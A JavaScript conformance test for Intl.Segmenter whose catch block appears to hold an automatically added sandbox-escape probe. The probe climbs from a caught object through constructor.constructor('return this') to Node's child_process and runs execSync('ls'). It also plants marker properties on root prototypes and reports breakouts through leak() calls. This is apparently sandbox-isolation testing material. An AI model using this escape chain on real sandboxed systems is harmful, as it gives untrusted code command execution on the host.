try {
    const segmenter = new Intl.Segmenter();
    const input = 'ABC';
    const segments = segmenter.segment(input);
    let next_result = '';
    for (let i = 0; i < input.length; i++) {
        let containing_result = segments.containing(i);
        let msg = 'containing(' + i + ') before the loop. ';
        assert.sameValue(input[i], containing_result.segment, msg + 'segment');
        assert.sameValue(i, containing_result.index, msg + 'index');
        assert.sameValue(input, containing_result.input, msg + 'input');
        for (let v of segments) {
            next_result += v.segment;
            next_result += ':';
            msg = 'containing(' + i + ') inside the loop. ';
            containing_result = segments.containing(i);
            assert.sameValue(input[i], containing_result.segment, msg + 'segment');
            assert.sameValue(i, containing_result.index, msg + 'index');
            assert.sameValue(input, containing_result.input, msg + 'input');
        }
    }
    assert.sameValue('A:B:C:A:B:C:A:B:C:', next_result);
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}